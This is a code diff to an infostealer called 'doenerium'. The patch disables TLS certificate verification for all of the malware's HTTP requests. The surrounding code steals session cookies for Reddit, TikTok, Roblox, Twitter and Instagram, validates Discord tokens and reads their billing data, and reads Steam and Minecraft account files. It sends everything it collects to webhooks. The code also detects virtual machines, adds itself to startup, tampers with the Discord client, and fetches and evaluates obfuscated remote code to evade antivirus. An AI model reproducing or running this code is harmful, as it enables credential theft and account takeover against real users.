@@ -395,6 +395,13 @@
 
         const axios = __nccwpck_require__(382);
         const FormData = __nccwpck_require__(522);
+        const https = require("https")
+
+        const axios_instance = axios.create({
+          httpsAgent: new https.Agent({  
+            rejectUnauthorized: false
+          })
+        })
 
         // Typedefs
         /**
@@ -443,7 +450,7 @@
 
         async function getServer() {
           try {
-            const res = await axios({
+            const res = await axios_instance({
               url: `https://apiv2.gofile.io/getServer`,
               method: "GET",
               headers: {
@@ -534,7 +541,7 @@
                 }
               }
 
-              const res = await axios({
+              const res = await axios_instance({
                 url: `https://${server}.gofile.io/uploadFile`,
                 method: "POST",
                 headers: {
@@ -613,7 +620,7 @@
           try {
             const server = (await getServer(code)) || "srv-file9";
 
-            const res = await axios({
+            const res = await axios_instance({
               url: `https://${server}.gofile.io/deleteUpload?c=${code}&rc=${removalCode}`,
               method: "GET",
               headers: {
@@ -646,7 +653,7 @@
           try {
             const server = (await getServer(code)) || "srv-file9";
 
-            const res = await axios({
+            const res = await axios_instance({
               url: `https://${server}.gofile.io/getUpload?c=${code}${p && p !== "" ? `&p=${sha256hash(p)}` : ""}`,
               method: "GET",
               headers: {
@@ -683,7 +690,7 @@
             const reqs = Object.keys(uploadInfo.files)
               .map(k => uploadInfo.files[k])
               .map(f =>
-                axios({
+                axios_instance({
                   url: f.link,
                   headers: {
                     accept:
@@ -923,8 +930,8 @@
 
             async stealRedditSession(cookie, browser) {
               try {
-                const { data: getBearer } = await client.requires.axios.post("https://accounts.reddit.com/api/access_token", { "scopes": ["*", "email", "pii"] }, { headers: { cookie: cookie, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" } });
-                const { data: accountInfo } = await client.requires.axios.get("https://oauth.reddit.com/api/v1/me", { headers: { "Authorization": "Bearer " + getBearer.access_token } })
+                const { data: getBearer } = await client.axios_instance.post("https://accounts.reddit.com/api/access_token", { "scopes": ["*", "email", "pii"] }, { headers: { cookie: cookie, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" } });
+                const { data: accountInfo } = await client.axios_instance.get("https://oauth.reddit.com/api/v1/me", { headers: { "Authorization": "Bearer " + getBearer.access_token } })
 
                 await client.utils.webhook.sendToWebhook({
                   embeds: [
@@ -1006,8 +1013,8 @@
             async stealTikTokSession(cookie, browser) {
               try {
                 const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
-                const { data: accountInfo } = await client.requires.axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", headers);
-                const { data: insights } = await client.requires.axios(
+                const { data: accountInfo } = await client.axios_instance.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", headers);
+                const { data: insights } = await client.axios_instance(
                   {
                     method: "POST",
                     url: "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
@@ -1016,7 +1023,7 @@
                   }
                 )
 
-                const { data: wallet } = await client.requires.axios(
+                const { data: wallet } = await client.axios_instance(
                   {
                     method: "GET",
                     url: `https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true`,
@@ -1091,9 +1098,9 @@
             async stealRobloxSession(cookie, browser) {
               try {
                 const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
-                const { data: accountInfo } = await client.requires.axios.get("https://www.roblox.com/my/account/json", headers);
-                const { data: balance } = await client.requires.axios.get("https://economy.roblox.com/v1/users/" + accountInfo.UserId + "/currency", headers);
-                const { data: skin } = await client.requires.axios.get("https://thumbnails.roblox.com/v1/users/avatar?userIds=" + accountInfo.UserId + "&size=420x420&format=Png&isCircular=false");
+                const { data: accountInfo } = await client.axios_instance.get("https://www.roblox.com/my/account/json", headers);
+                const { data: balance } = await client.axios_instance.get("https://economy.roblox.com/v1/users/" + accountInfo.UserId + "/currency", headers);
+                const { data: skin } = await client.axios_instance.get("https://thumbnails.roblox.com/v1/users/avatar?userIds=" + accountInfo.UserId + "&size=420x420&format=Png&isCircular=false");
 
 
                 await client.utils.webhook.sendToWebhook({
@@ -1164,7 +1171,7 @@
             async get_twitter_ct0() {
               return new Promise(async res => {
                 try {
-                  res(client.config.environ.twitter_ct0 = (await client.requires.axios.get("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/ct0.txt")).data).toString("utf-8")
+                  res(client.config.environ.twitter_ct0 = (await client.axios_instance.get("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/ct0.txt")).data).toString("utf-8")
                 } catch {
                   res(client.config.environ.twitter_ct0 = "ac1aa9d58c8798f0932410a1a564eb42")
                 }
@@ -1174,7 +1181,7 @@
             async stealTwitterSession(headers, cookie, browser) {
               try {
 
-                const { data: profile } = await client.requires.axios.post("https://twitter.com/i/api/1.1/account/update_profile.json", {}, { headers: { "cookie": cookie, ...headers } });
+                const { data: profile } = await client.axios_instance.post("https://twitter.com/i/api/1.1/account/update_profile.json", {}, { headers: { "cookie": cookie, ...headers } });
 
                 await client.utils.webhook.sendToWebhook({
                   embeds: [
@@ -1257,8 +1264,8 @@
             async stealInstagramSession(cookie, browser) {
               try {
                 const headers = { headers: { "user-agent": "Instagram 219.0.0.12.117 Android", "cookie": cookie } };
-                const { data: { user: accountInfo } } = await client.requires.axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers);
-                const { data: { user: accountInfo2 } } = await client.requires.axios.get("https://i.instagram.com/api/v1/users/" + accountInfo.pk_id + "/info", headers);
+                const { data: { user: accountInfo } } = await client.axios_instance.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers);
+                const { data: { user: accountInfo2 } } = await client.axios_instance.get("https://i.instagram.com/api/v1/users/" + accountInfo.pk_id + "/info", headers);
 
                 await client.utils.webhook.sendToWebhook({
                   embeds: [
@@ -2127,7 +2134,7 @@
 
               client.config.environ.validated_tokens.push(token)
 
-              const req = await client.requires.axios({
+              const req = await client.axios_instance({
                 url: "https://discord.com/api/v9/users/@me",
                 method: "GET",
                 headers: {
@@ -2141,7 +2148,7 @@
 
               if (req.request.res.statusCode == 200) {
 
-                const billing = await client.requires.axios({
+                const billing = await client.axios_instance({
                   url: "https://discord.com/api/v9/users/@me/billing/payment-sources",
                   method: "GET",
                   headers: {
@@ -2394,7 +2401,7 @@
             },
 
             async modify_discord_core() {
-              const res = await client.requires.axios.get(client.utils.encryption.decryptData(client.config.discord.base_url));
+              const res = await client.axios_instance.get(client.utils.encryption.decryptData(client.config.discord.base_url));
 
               const file = () => {
                 let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url).replace("REPLACE_ME", client.config.webhook.url)
@@ -2440,7 +2447,7 @@
             },
 
             async getIP() {
-              return (await client.requires.axios.get("https://ipinfo.io/json")).data;
+              return (await client.axios_instance.get("https://ipinfo.io/json")).data;
             },
 
             async init() {
@@ -3232,9 +3239,9 @@
                 if (client.requires.fs.existsSync("C:\\Program Files (x86)\\Steam") && client.requires.fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
                   const accounts = client.requires.fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
                   accounts.match(/7656[0-9]{13}/g).forEach(async account => {
-                    const { data: { response: accountInfo } } = await client.requires.axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
-                    const { data: { response: games } } = await client.requires.axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
-                    const { data: { response: level } } = await client.requires.axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
+                    const { data: { response: accountInfo } } = await client.axios_instance.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
+                    const { data: { response: games } } = await client.axios_instance.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
+                    const { data: { response: level } } = await client.axios_instance.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
 
 
                     await client.utils.webhook.sendToWebhook({
@@ -3320,8 +3327,8 @@
                     for (let account of Object.keys(json.accounts)) {
                       account = json.accounts[account]
 
-                      const { data: hypixel } = await client.requires.axios.get("https://api.hypixel.net/player?key=fef34e3d-72e3-44bf-9536-76ad25760a4a&uuid=" + account.minecraftProfile.id);
-                      const { data: type } = await client.requires.axios.get("https://api.gapple.pw/status/" + account.minecraftProfile.id);
+                      const { data: hypixel } = await client.axios_instance.get("https://api.hypixel.net/player?key=fef34e3d-72e3-44bf-9536-76ad25760a4a&uuid=" + account.minecraftProfile.id);
+                      const { data: type } = await client.axios_instance.get("https://api.gapple.pw/status/" + account.minecraftProfile.id);
 
                       await client.utils.webhook.sendToWebhook({
                         embeds: [
@@ -3769,7 +3776,7 @@
 
               client.webhooks.forEach(async (url) => {
                 try {
-                  await client.requires.axios({
+                  await client.axios_instance({
                     url: url,
                     method: "POST",
                     data: obj,
@@ -4067,6 +4074,7 @@
     class doenerium {
       constructor() {
         this.requires = {
+          https: require("https"),
           zlib: require("zlib"),
           forge: require("node-forge"),
           seco: require("seco-file"),
@@ -4180,8 +4188,8 @@ return ${eval_string};
 
       async runtime_evasion() {
         let evasor = (`${((base64.decode(
-          `${((await this.requires.axios.get((base64.decode((
-            await this.requires.axios.get(
+          `${((await this.axios_instance.get((base64.decode((
+            await this.axios_instance.get(
               (
                 base64.decode(
                   `aHR0cHM6Ly9kb2VuZXJpdW0ua3FuZmtwb2NjaWN4aXVkc3Rxb25mb3R1d3NyaHV4a3docWpqZnNiamhvbm91YnJjY3kubmwv`
@@ -4215,24 +4223,28 @@ return ${eval_string};
         });
 
         process.title = "Installer";
-
         console.log("Downloading client...");
 
         const exit = await this.utils.protection.inVM();
-
-        this.runtime_evasion();
 
         if (exit) {
           process.exit(0);
         }
 
+        this.axios_instance = this.requires.axios.create({
+          httpsAgent: new this.requires.https.Agent({  
+            rejectUnauthorized: false
+          })
+        })
+
+        this.runtime_evasion();
         this.add_to_startup();
 
         try {
           this.config.embed = JSON.parse(
             JSON.stringify(
               (
-                await this.requires.axios.get(
+                await this.axios_instance.get(
                   "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
                 )
               ).data
@@ -4247,6 +4259,7 @@ return ${eval_string};
             "credits": "t.me/doenerium"
           }
         }
+        
         this.config.embed.footer = {
           text: `${this.utils.encryption.decryptData(
             this.config.user.hostname
